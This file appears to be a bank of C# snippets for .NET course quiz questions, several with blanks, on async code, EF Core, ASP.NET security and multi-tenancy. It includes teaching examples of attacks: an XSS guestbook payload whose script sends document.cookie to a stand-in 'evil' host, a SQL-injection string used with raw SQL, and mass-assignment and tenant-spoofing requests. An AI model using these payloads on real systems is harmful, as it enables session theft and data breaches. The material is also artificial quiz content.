from code_1_4 import CODE, c

# ---------- Section 5 ----------
c("s5-001", r'''
public async Task<string> DownloadAsync(string url)
{
    string html = await httpClient.GetStringAsync(url);
    return html.Length + " chars";
}
''')
c("s5-005", r'''
for (int i = 0; i < 3; i++)
{
    int thisWorker = i;
    var thread = new Thread(() => Download(thisWorker));
    thread.Start();
}
''')
c("s5-006", r'''
Task<string> a = DownloadAsync("https://a");
Task<string> b = DownloadAsync("https://b");
string[] pages = await Task.WhenAll(a, b);
''')
c("s5-007", r'''
public class Downloader
{
    public event EventHandler<DownloadFinishedEventArgs>? Finished;
    public Action<string>? OnProgress;
}

downloader.Finished += (sender, e) => { };
downloader.OnProgress = null;                  // allowed
downloader.Finished = null;                    // ???
''')
c("s5-009", r'''
private async void SaveButton_Click(object sender, EventArgs e)
{
    await SaveAsync();
}

public async Task SaveAllAsync()
{
    await SaveAsync();
}
''')
c("s5-010", r'''
Channel<string> logLines = Channel.CreateBounded<string>(new BoundedChannelOptions(100)
{
    FullMode = BoundedChannelFullMode.Wait,
});

await logLines.Writer.WriteAsync(line);
''')
c("s5-013", r'''
byte[] buffer = ArrayPool<byte>.Shared.Rent(4096);
try
{
    int read = await stream.ReadAsync(buffer);
}
finally
{
    ????
}
''')
c("s5-014", r'''
public ValueTask<string> GetSettingAsync(string key)
{
    if (cache.TryGetValue(key, out string? value))
    {
        return ValueTask.FromResult(value);   // no Task allocated
    }
    return new ValueTask<string>(LoadAndCacheAsync(key));
}
''')
c("s5-015", r'''
dotnet run -c ???? -- --filter "*Lookup*"
''')
c("s5-017", r'''
[Benchmark(Baseline = true)]
public int Direct() { return text.Length; }

[Benchmark]
public int CachedPropertyInfo() { return (int)lengthProperty.GetValue(text)!; }
''')
c("s5-018", r'''
[Fact]
public void DictionaryKinds_PositivePositive_AllFourReturnTheSameValue()
{
    Assert.Equal(500, benchmark.Dictionary());
    Assert.Equal(500, benchmark.Frozen());
    Assert.Equal(500, benchmark.Sorted());
    Assert.Equal(500, benchmark.Immutable());
}
''')
c("s5-019", r'''
IAsyncEnumerable<PriceTickModel> ticks = PriceTickGenerator.StreamAsync("ACME", 5, delay);
???? (PriceTickModel tick in ticks)
{
    Console.WriteLine(tick.Price);
}
''')
c("s5-021", r'''
app.MapGet("/variations/ticks/broken", () => FailAfterTwo());

static async IAsyncEnumerable<PriceTickModel> FailAfterTwo()
{
    yield return new PriceTickModel(1, "ACME", 100m);
    await Task.Delay(10);
    yield return new PriceTickModel(2, "ACME", 101m);
    throw new InvalidOperationException("Price feed went down.");
}
''')
c("s5-022", r'''
List<OrderModel> all = await database.Orders.ToListAsync();

await foreach (OrderModel order in database.Orders.AsAsyncEnumerable())
{
}
''')
c("s5-023", r'''
List<string> names = await ReadBigOrders(0m)
    .Where(order => order.Customer.Length <= 3)
    .Select(order => order.Customer)
    .Take(2)
    .ToListAsync(cancellationToken);
''')
c("s5-026", r'''
public string GetPage()
{
    return httpClient.GetStringAsync(url).Result;
}
''')
c("s5-028", r'''
int primes = await Task.Run(() => CountPrimes(10_000_000));   // CPU work
string html = await Task.Run(() => httpClient.GetStringAsync(url)); // ?
''')
c("s5-029", r'''
public async Task<byte[]> ReadAllAsync(Stream stream)
{
    var memory = new MemoryStream();
    await stream.CopyToAsync(memory).ConfigureAwait(false);
    return memory.ToArray();
}
''')
c("s5-030", r'''
async Task FillAsync()
{
    Span<byte> span = stackalloc byte[16];
    await Task.Delay(10);
    span[0] = 1;
}
''')

# ---------- Section 6 ----------
c("s6-001", r'''
List<BookModel> books = await database.Books.ToListAsync();    // 1 query
foreach (BookModel book in books)
{
    Console.WriteLine(book.Author.Name);                        // lazy load: 1 query per book
}
''')
c("s6-004", r'''
List<BookModel> books = await database.Books
    .AsNoTracking()
    .OrderBy(book => book.Title)
    .ToListAsync();
''')
c("s6-005", r'''
database.Orders.Add(order);
await database.SaveChangesAsync();

stock.Quantity -= order.Quantity;
await database.SaveChangesAsync();   // crash here?
''')
c("s6-007", r'''
using (var scope = new TransactionScope(TransactionScopeAsyncFlowOption.Enabled))
{
    database.Orders.Add(order);
    await database.SaveChangesAsync();
    scope.Complete();
}
''')
c("s6-008", r'''
modelBuilder.Entity<ProductModel>().HasQueryFilter(product => !product.IsDeleted);

product.IsDeleted = true;
await database.SaveChangesAsync();
''')
c("s6-009", r'''
public class PriceService(IOptions<ShopSettings> a,
                          IOptionsSnapshot<ShopSettings> b,
                          IOptionsMonitor<ShopSettings> c)
{
    decimal Discount() { return c.CurrentValue.Discount; }
}
''')
c("s6-010", r'''
// 100 requests arrive at once, the cache is empty:
string? cached = await cache.GetStringAsync("prices");
if (cached == null)
{
    cached = await LoadPricesFromDatabaseAsync();   // all 100 run this
    await cache.SetStringAsync("prices", cached);
}
''')
c("s6-011", r'''
builder.Services.AddDistributedMemoryCache();
builder.Services.AddSession();
app.UseSession();

HttpContext.Session.SetString("Cart", JsonSerializer.Serialize(cart));
''')
c("s6-013", r'''
public class ApiErrorExceptionHandler : IExceptionHandler
{
    public async ValueTask<bool> TryHandleAsync(HttpContext context, Exception exception, CancellationToken token)
    {
        await Results.Problem("Something went wrong.", statusCode: 500).ExecuteAsync(context);
        return true;
    }
}

builder.Services.AddExceptionHandler<ApiErrorExceptionHandler>();
app.UseExceptionHandler();
''')
c("s6-014", r'''
HTTP/1.1 404 Not Found
Content-Type: application/problem+json

{
  "type": "https://tools.ietf.org/html/rfc9110#section-15.5.5",
  "title": "Not Found",
  "status": 404,
  "detail": "Book 999 not found."
}
''')
c("s6-015", r'''
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler("/Error");
}
''')
c("s6-016", r'''
string name = "' OR 1=1 --";
var safe = database.Products.FromSql($"SELECT * FROM Products WHERE Name = {name}");
var unsafe = database.Products.FromSqlRaw("SELECT * FROM Products WHERE Name = '" + name + "'");
''')
c("s6-017", r'''
int changed = await database.Products
    .Where(product => product.Category == "Computers")
    .ExecuteUpdateAsync(setters => setters.SetProperty(p => p.Price, p => p.Price * 1.10m));
''')
c("s6-018", r'''
modelBuilder.Entity<ProductModel>().Property(product => product.Version).IsConcurrencyToken();

product.Price = 99m;
await database.SaveChangesAsync();   // someone else saved this row a second ago
''')
c("s6-020", r'''
public class ProductConfiguration : IEntityTypeConfiguration<ProductModel>
{
    public void Configure(EntityTypeBuilder<ProductModel> builder)
    {
        builder.Property<int>("Id").ValueGeneratedOnAdd();
        builder.HasKey("Id");
    }
}

modelBuilder.ApplyConfiguration(new ProductConfiguration());
''')
c("s6-022", r'''
builder
    .HasDiscriminator<string>("Type")
    .HasValue<MaterialModel>("Material")
    .HasValue<ServiceModel>("Service");

-- Products: Id | PublicId | Name | Type     | Unit | HourlyRate
--           1  | ...      | Cement | Material | kg   | NULL
''')
c("s6-023", r'''
var materials = await database.Products.OfType<MaterialModel>().ToListAsync();
''')
c("s6-024", r'''
public class InvoiceModel
{
    public Guid PublicId { get; private set; }
    public string Customer { get; private set; }
}

builder.Property<int>("Id").ValueGeneratedOnAdd();
builder.HasKey("Id");
''')
c("s6-025", r'''
InvoiceModel invoice = database.Invoices.First();
int id = EF.Property<int>(invoice, "Id");
''')
c("s6-027", r'''
InvoiceModel acme = await database.Invoices.FirstAsync(i => i.Customer == "Acme"); // AutoInclude loads 3 lines
List<InvoiceModel> list = await database.Invoices.IgnoreAutoIncludes().ToListAsync();
Console.WriteLine(list.Single(i => i.Customer == "Acme").Lines.Count);
''')
c("s6-028", r'''
private readonly List<InvoiceLineModel> linesCollection = [];

public IEnumerable<InvoiceLineModel> LinesLeaky => linesCollection;
public IReadOnlyList<InvoiceLineModel> Lines => linesCollection.AsReadOnly();

((List<InvoiceLineModel>)invoice.LinesLeaky).Add(new InvoiceLineModel(id, -50m));
''')
c("s6-029", r'''
public class TablePerTypeDbContextVariation : DbContext
{
    public DbSet<ProductModel> Products => Set<ProductModel>();
    public DbSet<InvoiceLineModel> InvoiceLines => Set<InvoiceLineModel>();
    // no Invoices DbSet, but InvoiceModel is still mapped
}
''')
c("s6-030", r'''
await database.Products.OfType<MaterialModel>()
    .Join(database.InvoiceLines, m => m.PublicId, line => line.ProductId,
        (m, line) => new { Material = m, line.Amount })
    .GroupBy(pair => new { pair.Material.PublicId, pair.Material.Name },
        (key, group) => new ProductConsumptionModel
        {
            ProductId = key.PublicId, Name = key.Name, AmountSold = group.Sum(p => p.Amount),
        })
    .ToArrayAsync();
''')
c("s6-031", r'''
optionsBuilder.UseLazyLoadingProxies();

public class BookModel
{
    public virtual AuthorModel Author { get; set; } = null!;
}

string name = book.Author.Name;   // first touch
''')
c("s6-033", r'''
database.Orders.Add(order);
await database.SaveChangesAsync();          // saved
// power cut here
database.Stock.Update(stock);
await database.SaveChangesAsync();          // never runs
''')

# ---------- Section 7 ----------
c("s7-001", r'''
app.UseAuthentication();   // who are you? (reads the cookie / token)
app.UseAuthorization();    // may you do this? ([Authorize] rules)
''')
c("s7-003", r'''
[Authorize(Roles = "Admin")]
public IActionResult Dashboard()
{
    return View();
}
// called by a logged-in user with the "Customer" role
''')
c("s7-004", r'''
[Authorize(Roles = "Admin")]
[Authorize(Roles = "Auditor")]
public IActionResult Reports() { ... }

[Authorize(Roles = "Admin,Auditor")]
public IActionResult Overview() { ... }
''')
c("s7-005", r'''
@* a guestbook entry saved as:  <script>fetch('https://evil/?c='+document.cookie)</script> *@
<p>@entry.Message</p>
<p>@Html.Raw(entry.Message)</p>
''')
c("s7-006", r'''
<form method="post" asp-action="Transfer">
    @* the form tag helper adds: <input name="__RequestVerificationToken" type="hidden" value="CfDJ8..."> *@
</form>

[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult Transfer(TransferForm form) { ... }
''')
c("s7-008", r'''
builder.Services.AddAntiforgery(options =>
{
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});
// test client posts to http://localhost/...
''')
c("s7-009", r'''
context.Response.Headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'";
''')
c("s7-010", r'''
public class EmailSendingBackgroundService : ????
{
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        await foreach (EmailMessage message in queue.ReadAllAsync(stoppingToken))
        {
            await sender.SendAsync(message);
        }
    }
}
''')
c("s7-012", r'''
public class CleanupBackgroundService(IServiceScopeFactory scopeFactory) : BackgroundService
{
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        using IServiceScope scope = scopeFactory.CreateScope();
        var database = scope.ServiceProvider.GetRequiredService<ShopDbContext>();
    }
}
''')
c("s7-013", r'''
// A
while (!token.IsCancellationRequested)
{
    await DoWorkAsync();                    // takes 2 s
    await Task.Delay(TimeSpan.FromSeconds(10), token);
}

// B
using var timer = new PeriodicTimer(TimeSpan.FromSeconds(10));
while (await timer.WaitForNextTickAsync(token))
{
    await DoWorkAsync();
}
''')
c("s7-014", r'''
builder.Services.AddOutputCache();
app.UseOutputCache();

app.MapGet("/products", GetProducts).CacheOutput(policy => policy.Expire(TimeSpan.FromSeconds(30)));
''')
c("s7-016", r'''
[ResponseCache(Duration = 60)]
public IActionResult Prices() { ... }   // sends Cache-Control: public,max-age=60

[OutputCache(Duration = 60)]
public IActionResult Catalog() { ... }  // stored in the server's cache
''')
c("s7-017", r'''
bool onRandom = Random.Shared.Next(100) < percent;

int bucket = (int)(XxHash32.HashToUInt32(Encoding.UTF8.GetBytes(userId)) % 100);
bool onStable = bucket < percent;
''')
c("s7-018", r'''
my-repo/
├── ci.yml                         <- A
├── .github/workflows/ci.yml       <- B
└── Projects/
''')
c("s7-019", r'''
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
''')
c("s7-020", r'''
IF NOT EXISTS (SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20261114_AddOrders')
BEGIN
    CREATE TABLE [Orders] (...);
    INSERT INTO [__EFMigrationsHistory] VALUES (N'20261114_AddOrders', N'10.0.14');
END;
''')
c("s7-022", r'''
-- Release 1 (expand):   ALTER TABLE Customers ADD Email nvarchar(200) NULL;
--                       app v2 writes both Email and the old ContactEmail
-- Release 2 (contract): ALTER TABLE Customers DROP COLUMN ContactEmail;
''')
c("s7-023", r'''
IF NOT EXISTS (...)
BEGIN
    EXEC(N'CREATE OR ALTER PROCEDURE GetOrdersForCustomer @CustomerId int AS
    SELECT * FROM Orders WHERE CustomerId = @CustomerId');
END;
''')
c("s7-024", r'''
app.UseWebSockets();
app.Map("/ws/echo", async context =>
{
    using WebSocket socket = await context.WebSockets.AcceptWebSocketAsync();
    // both sides can now send at any time
});
''')
c("s7-025", r'''
var buffer = new byte[4];
WebSocketReceiveResult result = await socket.ReceiveAsync(buffer, token);
// the client sent "hello world" (11 bytes)
Console.WriteLine(result.EndOfMessage);
''')
c("s7-026", r'''
builder.Services.AddStackExchangeRedisCache(options =>
{
    options.Configuration = "localhost:6379";
});

await cache.SetStringAsync("price:42", "19.99");
''')
c("s7-027", r'''
public async Task UpdatePriceAsync(int productId, decimal newPrice)
{
    prices[productId] = product with { Price = newPrice };
    ????
}
''')
c("s7-028", r'''
public interface IDistributedCache
{
    byte[]? Get(string key);
    void Set(string key, byte[] value, DistributedCacheEntryOptions options);
}

await cache.SetStringAsync("price:42", "19.99");   // extension method
''')
c("s7-029", r'''
{
  "profiles": {
    "http": {
      "environmentVariables": { "ASPNETCORE_ENVIRONMENT": "????" }
    }
  }
}
''')
c("s7-031", r'''
{ "FeatureManagement": { "NewCheckout": false } }

if (await featureManager.IsEnabledAsync("NewCheckout"))
{
    return View("CheckoutV2");
}
''')

# ---------- Section 8 ----------
c("s8-002", r'''
app.MapGet("/books/{id:int}", Results<Ok<BookModel>, NotFound> (int id, BookStore store) =>
    store.FindById(id) is BookModel book ? TypedResults.Ok(book) : TypedResults.NotFound());

app.MapGet("/books2/{id:int}", IResult (int id, BookStore store) =>
    store.FindById(id) is BookModel book ? Results.Ok(book) : Results.NotFound());
''')
c("s8-003", r'''
public record BookLookupRequest([FromRoute] int Id, BookStore Store, [FromQuery] bool Uppercase);

app.MapGet("/books/{id:int}", ([AsParameters] BookLookupRequest request) => ...);
// GET /books/1
''')
c("s8-004", r'''
public class BookEntity { public int Id; public string Title; public decimal CostPrice; public string AddedBy; }
public record SaveBookRequestModel(string Title, string Author, int Year);

app.MapPost("/entity", (BookEntity book) => ...);
app.MapPost("/dto", (SaveBookRequestModel request) => ...);
// body: { "title": "Emma", "costPrice": -100, "addedBy": "hacker" }
''')
c("s8-005", r'''
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbm4iLCJyb2xlIjoiQWRtaW4ifQ.4pV...signature
   header (base64)        payload (base64): {"sub":"ann","role":"Admin"}     signature
''')
c("s8-007", r'''
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateLifetime = true,
    ClockSkew = TimeSpan.Zero,
};
''')
c("s8-008", r'''
// A
using var client = new HttpClient();
var rate = await client.GetFromJsonAsync<RateModel>(url);

// B
builder.Services.AddHttpClient<RateClient>(client => client.BaseAddress = new Uri("https://rates.example"));
''')
c("s8-010", r'''
builder.Services.AddHttpClient<RateClient>()
    .AddStandardResilienceHandler();
// rates service fails 10 times in a row...
''')
c("s8-011", r'''
options.AddTokenBucketLimiter("bucket", limiter =>
{
    limiter.TokenLimit = 4;
    limiter.TokensPerPeriod = 2;
    limiter.ReplenishmentPeriod = TimeSpan.FromSeconds(10);
});
''')
c("s8-013", r'''
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("fixed", o => { o.PermitLimit = 2; o.Window = TimeSpan.FromSeconds(10); });
    // options.RejectionStatusCode = ???
});
''')
c("s8-014", r'''
<PublishAot>true</PublishAot>

string json = JsonSerializer.Serialize(greeting);                              // reflection
string json2 = JsonSerializer.Serialize(greeting, AppJsonContext.Default.Greeting); // source-generated
''')
c("s8-015", r'''
<PublishTrimmed>true</PublishTrimmed>

Type type = Type.GetType("MyApp.Plugins." + name)!;
object plugin = Activator.CreateInstance(type)!;
''')
c("s8-016", r'''
dotnet publish -c Release -r linux-x64 --self-contained
dotnet publish -c Release -r linux-x64 --no-self-contained
''')
c("s8-017", r'''
Pages/
  Contacts.cshtml
  Contacts.cshtml.cs   <- public class ContactsModel : PageModel { public void OnGet() { } }
''')
c("s8-019", r'''
builder.Services.AddRazorComponents().AddInteractiveServerComponents();
app.MapRazorComponents<App>().AddInteractiveServerRenderMode();

<button @onclick="AddTodo">Add</button>   @* where does AddTodo run? *@
''')
c("s8-021", r'''
[Parameter] public EventCallback<TodoModel> OnAdded { get; set; }
[Parameter] public Action<TodoModel>? OnAddedAction { get; set; }

await OnAdded.InvokeAsync(todo);
OnAddedAction?.Invoke(todo);
''')
c("s8-022", r'''
public class ChatHub : Hub<IChatClient>
{
    public Task Send(string user, string text) { return Clients.All.ReceiveMessage(user, text); }
}

public class UntypedChatHub : Hub
{
    public Task Send(string user, string text) { return Clients.All.SendAsync("ReceiveMesage", user, text); }
}
''')
c("s8-023", r'''
await Clients.All.ReceiveMessage(user, text);
await Clients.Others.ReceiveMessage(user, text);
await Clients.Caller.ReceiveMessage(user, text);
''')
c("s8-024", r'''
syntax = "proto3";

service StockService {
  rpc GetStock (StockRequest) returns (StockReply);
}

message StockRequest { string sku = 1; }
message StockReply { string name = 1; int32 quantity = 2; }
''')
c("s8-025", r'''
try
{
    await client.GetStockAsync(request, deadline: DateTime.UtcNow.AddMilliseconds(50));
}
catch (RpcException error)
{
    Console.WriteLine(error.StatusCode);
}
''')
c("s8-026", r'''
builder.WebHost.ConfigureKestrel(options =>
{
    options.ListenLocalhost(5089, listen => listen.Protocols = HttpProtocols.Http2);
});
''')
c("s8-027", r'''
builder.Services.AddValidation();

public record SaveBookRequestModel(
    [property: Required, StringLength(200, MinimumLength = 1)] string Title,
    [property: Range(1450, 2100)] int Year);

app.MapPost("/books", (SaveBookRequestModel request) => ...);   // { "title": "", "year": 3000 }
''')
c("s8-029", r'''
public class ContactsModel : PageModel
{
    public void OnGet() { }
    public IActionResult ????() { ... }       // runs for <form method="post">
}
''')

# ---------- Section 9 ----------
c("s9-002", r'''
public static explicit operator decimal(MoneyValueObject money)
{
    return money.Amount;    // the currency is lost
}

decimal amount = (decimal)price;   // cast required
''')
c("s9-003", r'''
Func<ProductModel, bool> cheap = product => product.Price < 10;
Expression<Func<ProductModel, bool>> cheapExpression = product => product.Price < 10;

Console.WriteLine(cheapExpression);           // product => (product.Price < 10)
var compiled = cheapExpression.Compile();
''')
c("s9-004", r'''
Comparison<string> byLength = (left, right) => left.Length.CompareTo(right.Length);
var sorted = new List<string>(words);
sorted.????(byLength);
''')
c("s9-006", r'''
builder.Configuration
    .AddJsonFile("appsettings.json")
    .AddJsonFile($"appsettings.{environment}.json", optional: true)
    .AddEnvironmentVariables()
    .AddCommandLine(args);
// "Shop:Name" is set in appsettings.json AND on the command line
''')
c("s9-007", r'''
# shop.json            -> Categories: ["Tea", "Coffee", "Cocoa"]
# shop.Production.yaml
Categories:
  - Juice
''')
c("s9-008", r'''
public OrderBuilder ForCustomer(string name)
{
    customer = name;
    return ????;
}

var order = new OrderBuilder().ForCustomer("Ann").AddLine("Tea", 2).Build();
''')
c("s9-009", r'''
public class OrderInitVariation
{
    public required string Customer { get; init; }
}

var ok = new OrderInitVariation { Customer = "Ann" };
var missing = new OrderInitVariation();   // ?
''')
c("s9-010", r'''
public interface IShippingCostStrategy
{
    string Name { get; }
    decimal Cost(OrderModel order);
}

public class ExpressShippingStrategy : IShippingCostStrategy { ... }
public class FreeShippingStrategy : IShippingCostStrategy { ... }
''')
c("s9-011", r'''
public abstract class BaseOrderState
{
    public virtual BaseOrderState Pay() { throw new InvalidOperationException(); }
    public virtual BaseOrderState Ship() { throw new InvalidOperationException(); }
}

public class PaidState : BaseOrderState
{
    public override BaseOrderState Ship() { return new ShippedState(); }
}
''')
c("s9-012", r'''
OrderResult result = await mediator.Send(new PlaceOrderRequest("Ann", 3));
// which class handles PlaceOrderRequest? the caller doesn't know
''')
c("s9-013", r'''
public interface IEditorCommand
{
    void Execute();
    void Undo();
}

history.Push(command);
command.Execute();
// later:
history.Pop().Undo();
''')
c("s9-014", r'''
public abstract class BaseApprovalHandler
{
    private BaseApprovalHandler? next;

    public string Approve(decimal amount)
    {
        if (CanApprove(amount)) { return Name; }
        return next?.Approve(amount) ?? "nobody";
    }
}
''')
c("s9-015", r'''
public class LoggingNotifierDecorator(INotifier inner, ILogger logger) : INotifier
{
    public async Task SendAsync(string message)
    {
        logger.LogInformation("Sending {Message}", message);
        await inner.SendAsync(message);
    }
}
''')
c("s9-016", r'''
public class LoggingInterceptor<T> : DispatchProxy
{
    protected override object? Invoke(MethodInfo? method, object?[]? args)
    {
        Console.WriteLine($"calling {method!.Name}");
        return method.Invoke(target, args);
    }
}
''')
c("s9-017", r'''
var batch = new BatchBlock<ImportedOrderModel>(100);
var save = new ActionBlock<ImportedOrderModel[]>(SaveBatchAsync);
batch.LinkTo(save, new DataflowLinkOptions { PropagateCompletion = true });
''')
c("s9-019", r'''
public class TakePaymentStep : BaseWorkflowStep
{
    public override Task ExecuteAsync(WorkflowContext context) { ... charge card ... }
    public override Task CompensateAsync(WorkflowContext context) { ... refund ... }
}
// steps: Reserve -> TakePayment -> Ship (fails)
''')
c("s9-020", r'''
IObservable<PriceTickModel> settled = ticks.Throttle(TimeSpan.FromMilliseconds(100));
IObservable<PriceTickModel> sampled = ticks.Sample(TimeSpan.FromMilliseconds(100));
''')
c("s9-021", r'''
foreach (int price in prices) { }                  // you ask for each item

IDisposable subscription = priceStream.Subscribe(price => Console.WriteLine(price));
''')
c("s9-023", r'''
var a = provider.GetService<INeverRegistered>();
var b = provider.GetRequiredService<INeverRegistered>();
''')
c("s9-024", r'''
builder.Services.AddScoped<ShopDbContext>();
builder.Services.AddSingleton<PriceCache>();

public class PriceCache(ShopDbContext database) { ... }
''')
c("s9-026", r'''
builder.Services.AddControllers();
app.UseRouting();
app.UseAuthorization();
app.MapControllers();
app.MapGet("/health", () => "ok");
''')
c("s9-027", r'''
public class StaffDiscountVariation
{
    public string Code { get; init; } = "";
}

var discount = new StaffDiscountVariation { Code = "STAFF" };
typeof(StaffDiscountVariation).GetProperty("Code")!.SetValue(discount, "HACKED");
// discount.Code = "HACKED";  <- doesn't compile
''')
c("s9-028", r'''
MethodInfo method = typeof(StaffDiscountVariation)
    .GetMethod("ApplyStaffDiscount", BindingFlags.NonPublic | BindingFlags.Instance)!;
method.Invoke(discount, [150m]);   // the method throws ArgumentOutOfRangeException
''')
c("s9-033", r'''
Action<string> log = text => Console.WriteLine(text);
Func<decimal, decimal> addTax = price => price * 1.25m;
Predicate<string> isBlank = text => string.IsNullOrWhiteSpace(text);
''')

# ---------- Section 10 ----------
c("s10-001", r'''
public record TenantModel(string Id, string Name);

["acme"]   = new TenantModel("acme", "Acme Ltd"),
["globex"] = new TenantModel("globex", "Globex Corp"),
''')
c("s10-002", r'''
modelBuilder.Entity<ProjectModel>().HasQueryFilter(project => project.TenantId == CurrentTenantId);

var projects = await database.Projects.ToListAsync();
// SQL: SELECT ... FROM Projects WHERE TenantId = @tenant
''')
c("s10-004", r'''
// A (original)
public string CurrentTenantId => tenantContext.TenantId;
modelBuilder.Entity<ProjectModel>().HasQueryFilter(p => p.TenantId == CurrentTenantId);

// B (variation)
string tenantId = tenantContext.TenantId;
modelBuilder.Entity<ProjectModel>().HasQueryFilter(p => p.TenantId == tenantId);
''')
c("s10-005", r'''
builder.Services.AddSingleton<TenantStore>();
builder.Services.Add????<TenantContext>();
builder.Services.AddDbContext<AppDbContext>(...);
''')
c("s10-006", r'''
app.MapGet("/projects/{id:int}", async Task<Results<Ok<ProjectModel>, NotFound>> (int id, ProjectService service) =>
    await service.FindAsync(id) is ProjectModel project ? TypedResults.Ok(project) : TypedResults.NotFound());
// X-Tenant: acme   GET /projects/3   (project 3 belongs to globex)
''')
c("s10-007", r'''
// current tenant: acme (projects 1, 2); globex owns project 3
int count = await acme.Projects.FromSql($"SELECT * FROM Projects").CountAsync();
''')
c("s10-008", r'''
// current tenant: acme
int changed = await acme.Database.ExecuteSqlAsync($"UPDATE Projects SET Name = 'Raw' WHERE Id = 3");
// project 3 belongs to globex
''')
c("s10-010", r'''
string? tenantId = context.Request.Headers["X-Tenant"];
// curl -H "X-Tenant: globex" https://api.example/projects
''')
c("s10-011", r'''
public string TenantId => Tenant?.Id ?? "";

// a background job forgot to set the tenant:
var projects = await database.Projects.ToListAsync();
''')
c("s10-012", r'''
// shared:      one database, Projects(Id, TenantId, Name)
// per tenant:  "Data Source=acme.db", "Data Source=globex.db", ...
public UnfilteredDbContext CreateFor(string tenantId) { ... }
''')
c("s10-013", r'''
ProjectModel own = await acme.Projects.FirstAsync();
own.TenantId = "globex";
await acme.SaveChangesAsync();
''')
c("s10-015", r'''
public class TenantResolutionMiddleware(RequestDelegate next)
{
    public async Task InvokeAsync(HttpContext context, TenantStore store, TenantContext tenantContext)
    {
        ...
        await next(context);
    }
}
''')
c("s10-016", r'''
public record SaveProjectRequestModel([property: Required] string Name);

// X-Tenant: acme
// POST /projects   { "name": "Launch", "tenantId": "globex" }
''')
c("s10-017", r'''
[Fact]
public async Task Projects_NegativeNegative_OtherTenantsProject404()
{
    HttpClient acme = ClientFor("acme");
    Assert.Equal(HttpStatusCode.NotFound, (await acme.GetAsync("/projects/3")).StatusCode);
}
''')
c("s10-018", r'''
modelBuilder.Entity<ProjectModel>().HasIndex(project => project.TenantId);
''')
c("s10-019", r'''
-- Projects
Id | TenantId | Name
1  | acme     | Website
2  | acme     | Mobile app
3  | globex   | Rocket
''')
c("s10-020", r'''
10.1 Multi-tenancy           <- done
10.2 ????
10.3 Plans and limits
10.4 Billing webhooks
''')
c("s10-022", r'''
public static string? FromClaims(ClaimsPrincipal user)
{
    return user.Identity?.IsAuthenticated == true ? user.FindFirst("tenant")?.Value : null;
}
''')
c("s10-023", r'''
// JWT payload: { "sub": "ann", "tenant": "acme" }
string? tenant = user.FindFirst("tenant")?.Value;
string? fromHeader = context.Request.Headers["X-Tenant"];
''')
c("s10-024", r'''
// current tenant: acme; project 3 belongs to globex
int deleted = await database.Projects.Where(p => p.Id == 3).ExecuteDeleteAsync();
''')
c("s10-025", r'''
if (entry.State == EntityState.Added)
{
    entry.Entity.TenantId = CurrentTenantId;
}

acme.Projects.Add(new ProjectModel { Name = "Sneaky", TenantId = "globex" });
await acme.SaveChangesAsync();
''')
c("s10-028", r'''
SELECT * FROM acme.Projects;
SELECT * FROM globex.Projects;
-- vs one table: SELECT * FROM Projects WHERE TenantId = 'acme'
''')
